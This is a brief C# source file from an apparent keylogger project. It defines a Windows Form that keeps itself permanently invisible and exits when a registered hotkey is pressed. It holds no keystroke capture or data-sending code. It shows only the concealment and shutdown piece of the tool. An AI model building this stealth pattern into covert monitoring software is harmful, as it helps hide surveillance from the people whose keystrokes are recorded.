using System.Windows.Forms;
using KeyLogger.Enums;
using static KeyLogger.WinApis.User32;

namespace KeyLogger.Forms
{
	public class HiddenForm : Form
	{
		public int KeyId { get; set; }

		protected override void WndProc(ref Message m)
		{
			if (m.Msg == (int)CombineKeys.WM_HOTKEY)
			{
				if ((int)m.WParam == KeyId)
				{
					UnregisterHotKey(Handle, KeyId);
					Application.Exit();
				}
			}
			base.WndProc(ref m);
		}

		protected override void SetVisibleCore(bool value)
		{
			base.SetVisibleCore(false);
		}
	}
}
